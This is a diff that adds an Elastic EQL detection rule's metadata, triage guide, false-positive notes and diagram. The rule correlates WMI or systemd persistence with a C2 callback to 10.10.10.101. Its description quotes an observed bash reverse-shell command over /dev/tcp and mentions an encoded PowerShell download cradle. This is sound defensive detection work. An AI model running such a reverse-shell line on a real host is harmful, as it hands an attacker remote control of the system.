@@ -1,0 +1,123 @@
+# Elastic Detection Rule Metadata
+Name: "Cross-Platform Persistence Followed by C2 Callback [Campaign]"
+Description: |
+  Detects a two-stage attack sequence on a single host: persistence establishment
+  via WMI subscription (Windows) or systemd service file creation by a shell (Linux),
+  followed within 5 minutes by an outbound connection or command line reference to
+  a known C2 IP (10.10.10.101).
+
+  This is a campaign-level correlation rule. The C2 IP was observed in:
+    - A WMI CommandLineEventConsumer payload using IEX/WebClient encoded PowerShell
+    - A systemd ExecStart reverse shell (bash -i >& /dev/tcp/10.10.10.101/4444)
+  across Windows and Linux hosts, indicating a unified cross-platform campaign.
+
+  Individual stage rules should run in parallel for earlier single-event detection.
+
+Risk Score: 95          # Near-certain malicious — both stages required to fire
+Severity: critical
+Rule Type: EQL
+Index Patterns:
+  - logs-endpoint.events.*     # Elastic Defend
+  - logs-system.*              # System integration
+  - winlogbeat-*               # Winlogbeat (Sysmon forwarding)
+  - filebeat-*                 # Filebeat (auditd/syslog)
+  - .siem-signals-*            # Alert correlation (if chaining)
+
+Interval: 5m                   # Run every 5 minutes
+From: now-6m                   # Slight overlap to avoid gap at interval boundary
+Max Alerts Per Run: 100
+
+# MITRE ATT&CK Threat Mapping
+Threat:
+  - Tactic: Persistence
+    Technique: T1546.003 (WMI Event Subscription)
+  - Tactic: Persistence
+    Technique: T1543.002 (Systemd Service)
+  - Tactic: Command and Control
+    Technique: T1071.001 (Web Protocols)
+  - Tactic: Execution
+    Technique: T1059.001 (PowerShell)
+  - Tactic: Execution
+    Technique: T1059.004 (Unix Shell)
+
+# Investigation Guide (shown in alert detail in Kibana)
+Investigation Guide: |
+  ## Triage Steps
+
+  1. Identify the host from `host.name` in the alert.
+  2. Review Stage 1 event:
+     - Windows: check `winlog.event_data.CommandLine` or `Destination` for
+       the encoded payload. Decode the Base64 to confirm cradle type and C2 URL.
+     - Linux: check `file.path` for the service unit name and retrieve the
+       file contents from your FIM/EDR telemetry. Review ExecStart value.
+  3. Review Stage 2 event:
+     - Confirm destination IP, port, and initiating process.
+     - Check whether the connection succeeded (bytes transferred, duration).
+     - If process-based: decode/inspect the command line for payload details.
+  4. Pivot on `host.name` to find:
+     - EID 19 (filter creation) preceding the EID 20/21 events on Windows
+     - The parent process of the shell that wrote the service file on Linux
+     - Any lateral movement FROM this host after the C2 connection
+  5. Pivot on `destination.ip` (10.10.10.101) across ALL hosts:
+     - Additional hosts calling back to same C2 = active campaign
+     - If this IP is internal: treat as compromised pivot host, investigate it too
+  6. Containment:
+     - Isolate the host immediately if C2 connection confirmed successful
+     - Windows: remove WMI subscription objects via Get-WMIObject queries
+     - Linux: systemctl disable && systemctl stop <service>, delete unit file
+     - Block 10.10.10.101 at perimeter and any internal east-west firewall
+
+Tags:
+  - "Persistence"
+  - "C2"
+  - "WMI"
+  - "Systemd"
+  - "Cross-Platform"
+  - "Campaign: 2026-02 Internal Pivot"   # Tag with campaign name once attributed
+
+False Positive Analysis: |
+  This two-stage rule has extremely low FP rate in practice. The combination of
+  persistence creation AND C2 callback on the same host within 5 minutes is
+  very unlikely to occur legitimately.
+
+  Possible FPs:
+  - Authorised red team exercises: suppress by host tag or user
+  - Automated provisioning that creates services AND calls back to a management
+    IP that happens to match the IOC: validate the management IP list and update
+    the C2 IP list accordingly
+  - Security tooling that writes service files and then phones home for licensing
+
+Exception List: c2_ip_exceptions   # Maintain a shared exception list for IOC rotation
+```
+
+---
+
+### Architecture Diagram
+```
+WINDOWS HOST (WIN-WS01)          LINUX HOST (prod-web-03)
+─────────────────────────        ────────────────────────
+EID 19: Filter created           auditd: bash writes
+EID 20: Consumer created   ──┐   /etc/systemd/system/     ──┐
+EID 21: Binding created    ──┤   cloud-monitor.service      │
+                             │                               │
+                    Individual Sigma rules fire here         │
+                             │                               │
+                             ▼                               ▼
+                    ┌─────────────────────────────────────────┐
+                    │         ELASTIC EQL CORRELATION          │
+                    │                                          │
+                    │  Stage 1: Persistence event detected     │
+                    │           (either platform)              │
+                    │       +                                  │
+                    │  Stage 2: C2 callback within 5m          │
+                    │           to 10.10.10.101                │
+                    │                                          │
+                    │  by host.name, maxspan=5m                │
+                    └──────────────────┬──────────────────────┘
+                                       │
+                              Risk Score: 95
+                              Severity: CRITICAL
+                                       │
+                                       ▼
+                            Kibana Alert + Investigation
+                            Guide + MITRE mapping
